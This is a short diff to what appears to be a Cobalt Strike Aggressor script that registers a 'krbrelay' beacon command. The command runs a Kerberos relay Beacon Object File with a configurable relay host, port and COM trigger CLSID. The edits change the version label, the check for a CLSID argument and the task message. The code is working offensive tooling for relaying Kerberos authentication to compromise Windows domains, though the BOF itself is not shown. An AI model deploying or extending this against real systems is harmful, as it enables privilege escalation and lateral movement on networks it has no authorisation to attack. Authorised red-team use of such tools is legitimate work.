@@ -1,4 +1,4 @@
-println("[+] Loaded KrbRelay reusable single-activation BOF v37");
+println("[+] Loaded KrbRelay reusable single-activation BOF v37-neg2");
 
 beacon_command_register(
     "krbrelay",
@@ -27,7 +27,7 @@ alias krbrelay {
     $trigger = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";
 
     if (size(@_) == 5) {
-        if ($5 hasmatch '{.*}') {
+        if (substr($5, 0, 1) eq "{") {
             $trigger = $5;
         } else {
             $relay_host = $5;
@@ -39,6 +39,6 @@ alias krbrelay {
     }
 
     $packed = bof_pack($1, "zizzzz", $relay_host, int($2), $3, "127.0.0.1", $4, $trigger);
-    btask($1, "Running reusable single-activation Kerberos relay BOF v37");
+    btask($1, "Running reusable single-activation Kerberos relay BOF v37 [relay=" . $relay_host . "]");
     beacon_inline_execute($1, $object, "go", $packed);
 }
